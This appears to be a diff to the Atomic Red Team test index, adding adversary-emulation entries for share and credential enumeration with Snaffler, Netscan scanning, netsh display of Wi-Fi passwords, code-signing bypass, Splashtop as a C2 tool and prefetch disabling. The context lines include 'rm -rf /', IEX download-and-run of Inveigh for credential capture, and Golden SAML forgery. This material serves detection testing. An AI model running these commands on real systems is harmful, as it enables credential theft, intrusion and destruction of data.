@@ -3450,6 +3450,26 @@ input_arguments.sharp_path.type: String
 input_arguments.sharp_path.default: PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe
 
 "
+T1135,Network Share Discovery,Enumerate All Network Shares with Snaffler,b19d74b7-5e72-450a-8499-82e49e379d1a,"Snaffler is an open-source tool that has been used by various threat groups, including Scattered Spider/Muddled Libra, to enumerate accessible shares and credential-containing files within a domain. 
+[Reference](https://unit42.paloaltonetworks.com/muddled-libra/)
+",windows,,,"invoke-expression 'cmd /c start powershell -command { cmd /c ""#{snaffler_path}"" -a -o ""#{output_path}"" }; start-sleep 90; stop-process -name ""snaffler""'
+",powershell,False,,"remove-item ""#{output_path}"" -force -erroraction silentlycontinue",powershell,"dependencies.0.description: The Snaffler executable must exist on disk
+dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\Snaffler.exe"") {exit 0} else {exit 1}
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Snaffler.exe""
+","input_arguments.output_path.description: File to output enumeration results to
+
+input_arguments.output_path.type: String
+
+input_arguments.output_path.default: $env:temp\T1135SnafflerOutput.txt
+
+input_arguments.snaffler_path.description: Path to the Snaffler executable
+
+input_arguments.snaffler_path.type: String
+
+input_arguments.snaffler_path.default: PathToAtomicsFolder\..\ExternalPayloads\Snaffler.exe
+
+"
 T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,Mount ISO image,002cca30-4778-4891-878a-aaffcfa502fa,"Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/
 ",windows,,,"Mount-DiskImage -ImagePath ""#{path_of_iso}""
 ",powershell,,,"Dismount-DiskImage -ImagePath ""#{path_of_iso}"" | Out-Null
@@ -10346,6 +10366,27 @@ T1018,Remote System Discovery,Remote System Discovery - net group Domain Control
 Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the ""Domain Controller"" in the domain. Output will be via stdout.
 ",windows,,,"net group /domain ""Domain controllers""
 ",command_prompt,,,,,,
+T1018,Remote System Discovery,Enumerate Remote Hosts with Netscan,,This test uses Netscan to identify remote hosts in a specified network range.,windows,,,"cmd /c '#{netscan_path}' /hide /auto:""$env:temp\T1018NetscanOutput.txt"" /range:'#{range_to_scan}'",powershell,False,,"remove-item ""$env:temp\T1018NetscanOutput.txt"" -force -erroraction silentlycontinue
+",powershell,"dependencies.0.description: Netscan must be installed
+
+dependencies.0.prereq_command: if (Test-Path ""#{netscan_path}"") {exit 0} else {exit 1}
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\netscan.zip"" ""https://www.softperfect.com/download/files/netscan_portable.zip""
+Expand-Archive -LiteralPath ""PathToAtomicsFolder\..\ExternalPayloads\netscan.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\netscan""
+
+","input_arguments.netscan_path.description: NetScan exe location
+
+input_arguments.netscan_path.type: path
+
+input_arguments.netscan_path.default: PathToAtomicsFolder\..\ExternalPayloads\netscan\64-bit\netscan.exe
+
+input_arguments.range_to_scan.description: The IP range to scan with Netscan
+
+input_arguments.range_to_scan.type: string
+
+input_arguments.range_to_scan.default: 127.0.0.1-127.0.0.1
+
+"
 T1048,Exfiltration Over Alternative Protocol,Exfiltration Over Alternative Protocol - SSH,f6786cc8-beda-4915-a4d6-ac2f193bb988,"Input a domain and test Exfiltration over SSH
 
 Remote to Local
@@ -14244,7 +14285,7 @@ input_arguments.folder_to_delete.default: $env:TEMP\deleteme_folder_T1551.004
 T1070.004,Indicator Removal on Host: File Deletion,Delete Filesystem - Linux,f3aa95fe-4f10-4485-ad26-abf22a764c52,"This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.
 ",linux,,,"[ ""$(uname)"" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
 ",sh,,,,,,
-T1070.004,Indicator Removal on Host: File Deletion,Delete Prefetch File,36f96049-0ad7-4a5f-8418-460acaeb92fb,"Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run ""(Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" | Measure-Object).Count""
+T1070.004,Indicator Removal on Host: File Deletion,Delete Prefetch File,36f96049-0ad7-4a5f-8418-460acaeb92fb,"Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run `(Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" | Measure-Object).Count`
 before and after the test to verify that the number of prefetch files decreases by 1.
 ",windows,,,"Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])
 ",powershell,True,,,,,
@@ -14303,6 +14344,21 @@ Examples of this could be discovering the PID of lsass.exe to dump its memory or
 input_arguments.process_to_enumerate.type: string
 
 input_arguments.process_to_enumerate.default: lsass
+
+"
+T1057,Process Discovery,Process Discovery - Process Hacker,966f4c16-1925-4d9b-8ce0-01334ee0867d,"Process Hacker can be exploited to infiltrate system processes, identify weak points, or achieve unauthorized control over systems. However, its malicious use can often be flagged by security defenses, rendering it a perilous tool for illegitimate purposes.",windows,,,"Start-Process -FilePath ""$Env:ProgramFiles\Process Hacker 2\#{processhacker_exe}""",powershell,True,,,powershell,"dependencies.0.description: Process Hacker must be installed in the location
+dependencies.0.prereq_command: if (Test-Path ""c:\Program Files\Process Hacker 2\#{processhacker_exe}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: Write-Host Downloading Process Hacker
+New-Item -Type Directory ""C:\Temp\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://versaweb.dl.sourceforge.net/project/processhacker/processhacker2/processhacker-2.39-setup.exe"" -OutFile ""C:\Temp\ExternalPayloads\processhacker-2.39-setup.exe""
+Write-Host Installing Process Hacker
+Start-Process ""c:\Temp\ExternalPayloads\processhacker-2.39-setup.exe"" -Wait -ArgumentList ""/s""
+","input_arguments.processhacker_exe.description: Process hacker installation executables.
+
+input_arguments.processhacker_exe.type: string
+
+input_arguments.processhacker_exe.default: ProcessHacker.exe
 
 "
 T1078.001,Valid Accounts: Default Accounts,Enable Guest account with RDP capability and admin privileges,99747561-ed8d-47f2-9c91-1e5fde1ed6e0,"After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -15531,6 +15587,7 @@ input_arguments.file_data_length.type: integer
 input_arguments.file_data_length.default: 10
 
 "
+T1016.002,System Network Configuration Discovery: Wi-Fi Discovery,Enumerate Stored Wi-Fi Profiles And Passwords via netsh,,"Upon successful execution, information about previously connected Wi-Fi networks will be displayed with their corresponding key (if present).",windows,,,netsh wlan show profile * key=clear,command_prompt,False,,,,,
 T1072,Software Deployment Tools,Radmin Viewer Utility,b4988cad-6ed2-434d-ace5-ea2670782129,"An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.
 ",windows,,,"""%PROGRAMFILES(x86)%/#{radmin_exe}""
 ",command_prompt,True,,,powershell,"dependencies.0.description: Radmin Viewer Utility must be installed at specified location (#{radmin_exe})
@@ -16480,6 +16537,7 @@ input_arguments.ms_product.default: Word
 T1557.001,Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay,LLMNR Poisoning with Inveigh (PowerShell),deecd55f-afe0-4a62-9fba-4d1ba2deb321,Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.,windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing)
 Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",powershell,True,,,,,
+T1553.006,Subvert Trust Controls: Code Signing Policy Modification,Code Signing Policy Modification,,"Allows adversaries to subvert trust controls by modifying the code signing policy, enabling the execution of unsigned drivers.",windows,,,bcdedit /set testsigning on,command_prompt,True,,bcdedit /set testsigning off,,,
 T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,Service Registry Permissions Weakness,f7536d63-7fd4-466f-89da-7e48d550752a,"Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.
 reg add ""HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"" /f /v ImagePath /d ""C:\temp\AtomicRedteam.exe""
 ",windows,,,"get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
@@ -23734,6 +23792,27 @@ Download of RustDesk installer will be at the destination location when successf
 Invoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
 Start-Process -FilePath $file ""/S""",powershell,,,"$file = Join-Path $env:USERPROFILE ""Desktop\rustdesk-1.2.3-1-x86_64.exe""
 Remove-Item $file1 -ErrorAction Ignore",,,
+T1219,Remote Access Software,Splashtop Execution,,"An adversary may attempt to trick the user into downloading Splashtop for use as a C2 channel.
+Upon successful execution, Splashtop will be executed.
+",windows,,,"Start-Process ""#{Splashtop_Path}""
+",powershell,True,,"Stop-Process -Name ""strwinclt"" -force -erroraction silentlycontinue
+",powershell,"dependencies.0.description: Splashtop must exist at ""#{Splashtop_Path}""
+
+dependencies.0.prereq_command: if (Test-Path ""#{Splashtop_Path}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\splashtop_install.exe"" ""https://download.splashtop.com/winclient/STP/Splashtop_Personal_Win_v3.6.6.0.exe""
+start-sleep 30
+start-process ""PathToAtomicsFolder\..\ExternalPayloads\splashtop_install.exe"" /S  
+start-sleep 30      
+
+","input_arguments.Splashtop_Path.description: Path of Splashtop executable
+
+input_arguments.Splashtop_Path.type: path
+
+input_arguments.Splashtop_Path.default: ${env:programfiles(x86)}\Splashtop\Splashtop Remote\Client for STP\strwinclt.exe
+
+"
 T1112,Modify Registry,Modify Registry of Current User Profile - cmd,1324796b-d0f6-455a-b4ae-21ffee6aa6b9,"Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message ""The operation completed successfully.""
 will be displayed. Additionally, open Registry Editor to view the new entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced.
 ",windows,,,"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
@@ -24202,6 +24281,10 @@ input_arguments.remove_rdp_access_during_cleanup.type: integer
 input_arguments.remove_rdp_access_during_cleanup.default: 0
 
 "
+T1112,Modify Registry,Disable Windows Prefetch Through Registry,,"Modify the registry of the machine to disable prefetch. Disabling prefetch will remove one artifact for evidence of application execution. Restart is required post modification
+",windows,,,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 0 /f
+",command_prompt,True,,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v ""EnablePrefetcher"" /t REG_DWORD /d 3 /f
+",,,
 T1606.002,Forge Web Credentials: SAML token,Golden SAML,b16a03bc-1089-4dcc-ad98-30fe8f3a2b31,"Forge a ""Golden SAML"" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). 
 You will need the ADFS token signing certificate (see T1552.004 to export it).
 More info here : https://o365blog.com/post/adfs/
